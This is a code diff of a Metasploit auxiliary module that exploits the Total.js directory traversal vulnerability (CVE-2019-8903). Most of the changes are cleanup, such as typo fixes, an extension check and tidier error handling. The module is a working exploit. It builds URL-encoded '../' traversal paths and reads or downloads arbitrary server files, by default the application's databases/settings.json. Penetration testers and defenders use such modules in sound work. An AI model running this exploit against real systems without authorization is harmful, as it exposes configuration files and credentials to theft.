@@ -1,21 +1,17 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-
-require 'msf/core'
 
 # Check and exploit Total.js Directory Traversal (CVE-2019-8903)
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
-  Rank = NormalRanking
-
   def initialize(info = {})
     super(update_info(info,
-      'Name' => 'Total.js < 3.2.4 Directory Traversal',
+      'Name' => 'Total.js prior to 3.2.4 Directory Traversal',
       'Description' => %q(
-        This module check and exploits a directory traversal vulnerability in Total.js < 3.2.4.
+        This module check and exploits a directory traversal vulnerability in Total.js prior to 3.2.4.
 
         Here is a list of accepted extensions: flac, jpg, jpeg, png, gif, ico, js, css, txt, xml,
         woff, woff2, otf, ttf, eot, svg, zip, rar, pdf, docx, xlsx, doc, xls, html, htm, appcache,
@@ -40,7 +36,7 @@ class MetasploitModule < Msf::Auxiliary
         [
           ['CHECK', { 'Description' => 'Check if the target is vulnerable' }],
           ['READ', { 'Description' => 'Attempt to print file content' }],
-          ['DOWNLOAD', { 'Description' => 'Attempt to downlaod a file' }]
+          ['DOWNLOAD', { 'Description' => 'Attempt to download a file' }]
         ],
       'DefaultAction' => 'CHECK'))
 
@@ -51,6 +47,22 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('FILE', [true, 'File to obtain', 'databases/settings.json'])
       ]
     )
+  end
+
+  def check_ext
+    extensions = %w[
+      flac jpg jpeg png gif ico js css txt xml
+      woff woff2 otf ttf eot svg zip rar pdf
+      docx xlsx doc xls html htm appcache
+      manifest map ogv ogg mp4 mp3 webp webm
+      swf package json md m4v jsx heif heic
+    ]
+
+    ext = datastore['FILE'].split('.').last
+
+    unless extensions.include? ext
+      print_warning "Extension #{ext} is not supported by the HTTP static route of the framework"
+    end
   end
 
   def check
@@ -70,7 +82,7 @@ class MetasploitModule < Msf::Auxiliary
         print_status("App version: #{json['version']}")
         return Exploit::CheckCode::Vulnerable
       end
-    elsif res && res.headers['X-Powered-By'] =~ [Ttoaljs]
+    elsif res && res.headers['X-Powered-By'].to_s.downcase.include?('total.js')
       print_status('Target appear to be vulnerable!')
       print_status("X-Powered-By: #{res.headers['X-Powered-By']}")
       return Exploit::CheckCode::Detected
@@ -81,6 +93,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def read
+    check_ext
     traverse = '%2e%2e%2f' * datastore['DEPTH']
     uri = normalize_uri(target_uri.path) + traverse + datastore['FILE']
 
@@ -88,19 +101,21 @@ class MetasploitModule < Msf::Auxiliary
       'method' => 'GET',
       'uri' => uri
     )
-    if res && res.code == 200
-      print_status("Getting #{datastore['FILE']}...")
-      print_line(res.body)
-    elsif res && res.code != 200
-      print_error("Unable to read '#{datastore['FILE']}', possibily because:")
+    unless res
+      fail_with(Failure::Unreachable, 'Connection failed')
+    end
+    if res.code != 200
+      print_error("Unable to read '#{datastore['FILE']}', possibly because:")
       print_error("\t1. File does not exist.")
       print_error("\t2. No permission.")
-    else
-      print_error("[#{target_host}] - Generic error")
+      return
     end
+    print_status("Getting #{datastore['FILE']}...")
+    print_line(res.body)
   end
 
   def download
+    check_ext
     traverse = '%2e%2e%2f' * datastore['DEPTH']
     uri = normalize_uri(target_uri.path) + traverse + datastore['FILE']
 
@@ -108,28 +123,28 @@ class MetasploitModule < Msf::Auxiliary
       'method' => 'GET',
       'uri' => uri
     )
-    if res && res.code == 200
-      fname = datastore['FILE'].split('/')[-1].chop
-      ctype = res.headers['Content-Type'].split(';')
-      loot = store_loot('lfi.data', ctype[0], rhost, res.body, fname)
-      print_good("File #{fname} downloaded to: #{loot}")
-    elsif res && res.code != 200
-      print_error("Unable to read '#{datastore['FILE']}', possibily because:")
+    unless res
+      fail_with(Failure::Unreachable, 'Connection failed')
+    end
+    if res.code != 200
+      print_error("Unable to read '#{datastore['FILE']}', possibly because:")
       print_error("\t1. File does not exist.")
       print_error("\t2. No permission.")
-    else
-      print_error("[#{target_host}] - Generic error")
+      return
     end
+    fname = datastore['FILE'].split('/')[-1].chop
+    ctype = res.headers['Content-Type'].split(';')
+    loot = store_loot('lfi.data', ctype[0], rhost, res.body, fname)
+    print_good("File #{fname} downloaded to: #{loot}")
   end
 
   def run
-    if action.name == 'CHECK'
+    case action.name
+    when 'CHECK'
       check
-
-    elsif action.name == 'READ'
+    when 'READ'
       read
-
-    elsif action.name == 'DOWNLOAD'
+    when 'DOWNLOAD'
       download
     end
   end
